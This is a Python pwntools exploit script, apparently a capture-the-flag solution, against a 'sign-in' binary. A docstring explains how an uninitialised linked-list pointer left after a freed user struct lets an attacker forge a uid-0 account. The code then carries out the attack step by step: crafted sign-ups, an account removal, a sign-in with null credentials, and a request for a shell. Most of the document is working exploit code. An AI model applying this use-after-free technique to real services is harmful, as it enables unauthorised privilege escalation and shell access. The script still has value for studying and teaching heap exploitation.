from pwn import *

"""
When removing an account, the curr->user is free'd followed by the curr user
list entry. When signing up an account, the user struct is allocated, followed
by the user list entry struct. The list entry is appended to the end of the
linked list. In the sign up function, the entry->next is not initialised to
NULL, so it will retain the value of password from a previously free'd user
struct. By signing up a user with a password pointing to a pointer containing 3
zero QWORDs (or one zero QWORD followed by two known values), we can sign in as
a user with uid 0 with an empty username and password.

To find a suitable password, we can search memory in fixed address regions
(there is no PIE) and look for something that fits the conditions.
"""

# context.log_level = 'debug'
if os.getenv('RUNNING_IN_DOCKER'):
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h', '-p', '75']
else:
    gdb.binary = lambda: 'gef'
    context.terminal = ['alacritty', '-e', 'zsh', '-c']

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

def sign_up(username, password):
    sla(b'> ', b'1')
    sa(b'username: ', username)
    sa(b'password: ', password)

def sign_in(username, password):
    sla(b'> ', b'2')
    sa(b'username: ', username)
    sa(b'password: ', password)

def remove_account():
    sla(b'> ', b'3')

def get_shell():
    sla(b'> ', b'4')

exe = ELF("../src/sign-in")

zero_ptr = 0x402eb8

conn = remote('0.0.0.0', 1337)
# conn = process([exe.path])
# gdb.attach(conn, 'dump binary memory mem.bin 0x400000 0x405000')

sign_up(b'x', p64(zero_ptr))
sign_in(b'x', p64(zero_ptr))
remove_account()
sign_up(b'x', b'y')
sign_in(p64(0), p64(0))
get_shell()

conn.interactive()
